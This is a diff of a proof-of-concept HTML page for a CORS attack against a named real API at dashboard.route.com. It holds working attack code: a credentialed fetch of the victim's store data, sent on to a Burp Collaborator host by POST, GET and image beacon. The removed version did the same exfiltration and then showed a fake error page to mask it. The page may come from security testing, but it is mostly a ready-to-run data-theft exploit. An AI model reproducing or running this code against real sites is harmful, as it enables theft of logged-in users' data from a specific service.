@@ -1,47 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC - One Click</title>
+    <title>CORS PoC</title>
 </head>
-<body style="font-family: Arial; padding: 50px;">
-    <h1>CORS Attack - One Click</h1>
-    <p>This will redirect you to the API endpoint after 3 seconds.</p>
-    <p>You will see 2 alerts showing the stolen data.</p>
-    <button onclick="attack()" style="padding: 20px; font-size: 18px; cursor: pointer;">
-        START ATTACK
-    </button>
+<body>
+    <h1>CORS Attack</h1>
+    
+    <label>Collaborator URL:</label><br>
+    <input type="text" id="collab" value="https://your-id.burpcollaborator.net" style="width:400px;padding:5px;"><br><br>
+    
+    <button onclick="attack()" style="padding:10px 20px;font-size:16px;">ATTACK</button>
 
     <script>
-        // ===== CHANGE THIS TO YOUR COLLABORATOR URL =====
-        var COLLABORATOR = 'https://your-id.burpcollaborator.net';
-        // ================================================
-
         function attack() {
-            alert('Redirecting to API in 3 seconds...\n\nYou will see the stolen data in the next alert.');
-            setTimeout(function() {
-                window.location.href = 'https://dashboard.route.com/api/mn/v1/stores';
-            }, 3000);
+            var COLLAB = document.getElementById('collab').value;
+            
+            if (!COLLAB || COLLAB === 'https://your-id.burpcollaborator.net') {
+                alert('Please set your collaborator URL first!');
+                return;
+            }
+            
+            // Fetch API
+            fetch('https://dashboard.route.com/api/mn/v1/stores', {
+                method: 'GET',
+                credentials: 'include',
+                mode: 'cors'
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Alert the response
+                alert('STOLEN DATA:\n\n' + data);
+                
+                // Send to collaborator
+                sendToCollab(data, COLLAB);
+                
+                alert('Data sent to: ' + COLLAB);
+            })
+            .catch(err => {
+                alert('Error: ' + err.message + '\n\nMake sure you are logged in to dashboard.route.com');
+            });
         }
 
-        // Auto-capture when on API page
-        if (window.location.pathname.includes('/api/')) {
-            var data = document.body.innerText;
+        function sendToCollab(data, collab) {
+            // Method 1: POST
+            fetch(collab, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: data
+            });
             
-            // Alert 1: Show data
-            alert('STOLEN DATA:\n\n' + data);
+            // Method 2: GET
+            fetch(collab + '?data=' + encodeURIComponent(data), {
+                mode: 'no-cors'
+            });
             
-            // Send to collaborator (3 methods)
-            fetch(COLLABORATOR, {method: 'POST', mode: 'no-cors', body: data});
-            fetch(COLLABORATOR + '?d=' + encodeURIComponent(data), {mode: 'no-cors'});
-            new Image().src = COLLABORATOR + '?img=1&d=' + encodeURIComponent(data.substring(0, 500));
+            // Method 3: Image
+            new Image().src = collab + '/img?d=' + encodeURIComponent(data.substring(0, 500));
             
-            // Alert 2: Confirm
-            alert('Data sent to collaborator:\n' + COLLABORATOR + '\n\nCheck Burp Collaborator now!');
-            
-            // Fake error
-            setTimeout(function() {
-                document.body.innerHTML = '<h1>Error</h1><p>Please try again later.</p>';
-            }, 2000);
+            console.log('Data sent to:', collab);
         }
     </script>
 </body>
